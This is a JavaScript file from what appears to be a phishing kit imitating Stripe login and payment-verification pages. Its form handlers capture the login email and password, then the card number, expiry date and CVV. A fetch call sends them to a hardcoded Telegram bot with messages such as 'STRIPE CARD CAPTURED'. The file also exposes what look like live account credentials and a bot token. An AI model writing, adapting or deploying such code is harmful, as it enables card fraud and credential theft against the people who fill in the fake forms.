// ===== CONFIGURATION ===== //
const TEST_EMAIL = "Snowqueen20021@icloud.com";
const TEST_PASSWORD = "$Queen1234";
const TELEGRAM_BOT_TOKEN = "7813235070:AAGEOAio5gWtoiNZz9MF-dzictp7vZ4erWA";
const TELEGRAM_CHAT_ID = "7175428395";

// ===== FORM HANDLING ===== //
document.addEventListener("DOMContentLoaded", () => {
  // Login Form
  const loginForm = document.getElementById("loginForm");
  if (loginForm) {
    loginForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const email = document.getElementById("loginEmail").value;
      const password = document.getElementById("loginPassword").value;

      if (email === TEST_EMAIL && password === TEST_PASSWORD) {
        localStorage.setItem("stripe_auth", "true");
        await sendToTelegram(`🔐 **STRIPE LOGIN**\n📧 ${email}\n🔑 ${password}`);
        window.location.href = "dashboard.html";
      } else {
        alert("❌ Invalid credentials. Try again.");
      }
    });
  }

  // Payment Verification Form
  const verifyForm = document.getElementById("verifyForm");
  if (verifyForm) {
    verifyForm.addEventListener("submit", async (e) => {
      e.preventDefault();
      const cardNumber = document.getElementById("cardNumber").value;
      const expiry = document.getElementById("expiry").value;
      const cvv = document.getElementById("cvv").value;

      await sendToTelegram(
        `💳 **STRIPE CARD CAPTURED**\n\n📧 ${TEST_EMAIL}\n💳 ${cardNumber}\n📅 ${expiry}\n🔢 ${cvv}`
      );
      window.location.href = "success.html";
    });
  }

  // Logout Functionality
  document.getElementById("logoutBtn")?.addEventListener("click", () => {
    localStorage.removeItem("stripe_auth");
    window.location.href = "login.html";
  });
});

// ===== TELEGRAM BOT INTEGRATION ===== //
async function sendToTelegram(message) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return;
  const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
  try {
    await fetch(url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: "Markdown",
      }),
    });
  } catch (error) {
    console.error("Telegram Error:", error);
  }
}
